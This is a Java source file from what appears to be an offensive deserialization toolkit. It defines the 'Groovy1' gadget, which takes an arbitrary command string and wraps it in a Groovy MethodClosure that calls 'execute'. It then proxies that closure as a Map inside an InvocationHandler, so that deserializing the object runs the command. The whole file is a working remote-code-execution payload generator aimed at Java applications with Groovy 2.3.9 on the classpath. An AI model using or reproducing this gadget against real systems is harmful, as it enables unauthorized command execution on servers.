package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.lang.reflect.InvocationHandler;
import java.util.Map;

import static com.qi4l.JYso.gadgets.utils.Utils.createProxy;

@Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
@Authors({Authors.FROHOFF})
public class Groovy1 implements ObjectPayload<InvocationHandler> {

    public InvocationHandler getObject(final String command) throws Exception {
        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");

        final Map map = createProxy(closure, Map.class);

        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);

        return handler;
    }
}